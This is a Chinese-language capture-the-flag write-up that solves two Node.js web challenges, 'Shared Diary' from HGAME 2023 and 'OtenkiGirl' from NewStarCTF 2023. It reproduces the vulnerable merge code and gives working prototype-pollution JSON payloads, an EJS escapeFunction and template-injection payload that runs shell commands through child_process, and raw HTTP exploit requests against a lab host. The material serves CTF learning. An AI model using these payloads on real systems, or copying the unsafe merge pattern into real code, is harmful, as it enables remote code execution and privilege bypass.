## [HGAME 2023 week4]Shared Diary

给了源码

```javascript
const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const randomize = require('randomatic');
const ejs = require('ejs');
const path = require('path');
const app = express();

function merge(target, source) {
    for (let key in source) {
        // Prevent prototype pollution
        if (key === '__proto__') {
            throw new Error("Detected Prototype Pollution")
        }
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
}

app
    .use(bodyParser.urlencoded({extended: true}))
    .use(bodyParser.json());
app.set('views', path.join(__dirname, "./views"));
app.set('view engine', 'ejs');
app.use(session({
    name: 'session',
    secret: randomize('aA0', 16),
    resave: false,
    saveUninitialized: false
}))

app.all("/login", (req, res) => {
    if (req.method == 'POST') {
        // save userinfo to session
        let data = {};
        try {
            merge(data, req.body)
        } catch (e) {
            return res.render("login", {message: "Don't pollution my shared diary!"})
        }
        req.session.data = data

        // check password
        let user = {};
        user.password = req.body.password;
        if (user.password=== "testpassword") {
            user.role = 'admin'
        }
        if (user.role === 'admin') {
            req.session.role = 'admin'
            return res.redirect('/')
        }else {
            return res.render("login", {message: "Login as admin or don't touch my shared diary!"})
        } 
    }
    res.render('login', {message: ""});
});

app.all('/', (req, res) => {
    if (!req.session.data || !req.session.data.username || req.session.role !== 'admin') {
        return res.redirect("/login")
    }
    if (req.method == 'POST') {
        let diary = ejs.render(`<div>${req.body.diary}</div>`)
        req.session.diary = diary
        return res.render('diary', {diary: req.session.diary, username: req.session.data.username});
    }
    return res.render('diary', {diary: req.session.diary, username: req.session.data.username});
})


app.listen(8888, '0.0.0.0');
```

有`merge(data, req.body)`函数，过滤了`__proto__`还可以用下面的

```javascript
objectname["__proto__"]
objectname.__proto__
objectname.constructor.prototype
```

payload

```json
{
    "username": "123",
    "password": "123",
    "constructor": {
        "prototype": {
            "role": "admin"
        }
    }
}
```

或者

```
{
    "username": "123",
    "password": "123",
    "constructor": {
        "prototype": {
            "role": "admin",
            "data":{"username":"admin"}
        }
    }
}
```

也可以直接利用ejs.render本身存在的漏洞实现RCE 

```
{"constructor": {"prototype": {"role":"admin", "data":{"username":"admin"}, "client":true,"escapeFunction":"1; return global.process.mainModule.constructor._load('child_process').execSync('cat /flag');"}},"username":"admin","password":"admin"}
```

接着登录上去，是ejs的模板注入

payload

```
<%- global.process.mainModule.require('child_process').execSync('cat /flag') %>
```

## NewStarCTF 2023 WEEK3 OtenkiGirl

这题把所有源码直接给了

还给了个提示

```
『「routes」フォルダーだけを見てください。SQLインジェクションはありません。』と御坂御坂は期待に満ちた気持ちで言った。
“只看”routes“文件夹。没有SQL注入。“御坂御坂带着充满期待的心情说道。
```

那我们就只看`routes`文件夹

`submit.js`

首先发现了`merge`函数,猜测可能是原型链污染

```javascript
const merge = (dst, src) => {
    if (typeof dst !== "object" || typeof src !== "object") return dst;
    for (let key in src) {
        if (key in dst && key in src) {
            dst[key] = merge(dst[key], src[key]);
        } else {
            dst[key] = src[key];
        }
    }
    return dst;
}
```

然后就是找，谁调用了`merge`函数

![image-20240327205933012](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240327205933012.png)

```javascript
const result = await insert2db(merge(DEFAULT, data));
ctx.body = {
            status: "success",
            data: result
        };
```

接着看`insert2db`函数，主要是把数据插入到数据库中，这里也没有sql注入，那我们接着看

```javascript
await sql.run(`INSERT INTO wishes (wishid, date, place, contact, reason, timestamp) VALUES (?, ?, ?, ?, ?, ?)`,[wishid, date, place, contact, reason, timestamp]).catch(e => { throw e });
return { wishid, date, place, contact, reason, timestamp }
```

其实这个函数没啥用（对这一题），主要看`/submit`路由

```javascript
router.post("/submit", async (ctx) => {
    const jsonText = ctx.request.rawBody || "{}"
    try {
        const data = JSON.parse(jsonText);
        .......
        const result = await insert2db(merge(DEFAULT, data));
        ctx.body = {
            status: "success",
            data: result
        };
    } catch (e) {
        console.error(e);
        ctx.body = {
            status: "error",
            msg: "Internal Server Error"
        }
    }
})
```

`data = JSON.parse(jsonText)`这里是进入点

`info.js`

```javascript
router.post("/info/:ts?", async (ctx) => {
    ......
    if (typeof ctx.params.ts === "undefined") ctx.params.ts = 0
    const timestamp = /^[0-9]+$/.test(ctx.params.ts || "") ? Number(ctx.params.ts) : ctx.params.ts;
    if (typeof timestamp !== "number")
        return ctx.body = {
            status: "error",
            msg: "Invalid parameter ts"
        }

    try {
        const data = await getInfo(timestamp).catch(e => { throw e });
        ctx.body = {
            status: "success",
            data: data
        }
    } catch (e) {
        console.error(e);
        return ctx.body = {
            status: "error",
            msg: "Internal Server Error"
        }
    }
})
```

接着看`getInfo`函数

```javascript
async function getInfo(timestamp) {
    timestamp = typeof timestamp === "number" ? timestamp : Date.now();
    // Remove test data from before the movie was released
    let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();
    timestamp = Math.max(timestamp, minTimestamp);
    const data = await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp >= ?`, [timestamp]).catch(e => { throw e });
    return data;
}
```

将我们传入的`ts`的值，赋值给`timestamp`

而在`getInfo`函数中,`timestamp = Math.max(timestamp, minTimestamp);`取一个最大的值

`let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();`，这里用的是`||`

而且config里面没有`min_public_time`这个属性，那么这里就是一个污染点

![image-20240327211541027](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240327211541027.png)

payload

```http
POST /submit HTTP/1.1
Host: d537bd54-f21f-4d58-8d85-2b346bf42e78.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://d537bd54-f21f-4d58-8d85-2b346bf42e78.node5.buuoj.cn:81/
Content-Type: application/json
Content-Length: 102
Origin: http://d537bd54-f21f-4d58-8d85-2b346bf42e78.node5.buuoj.cn:81
Connection: close

{
	"date":"",
	"place":"",
	"contact":"1",
	"reason":"1",
	"__proto__":{
		"min_public_time":"1001-01-01"
	}
}
```

这里`"contact":"1","reason":"1",`是必须有的

然后访问`/info/0`

```http
POST /info/0 HTTP/1.1
Host: d537bd54-f21f-4d58-8d85-2b346bf42e78.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

得到flag

![image-20240327204815020](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240327204815020.png)
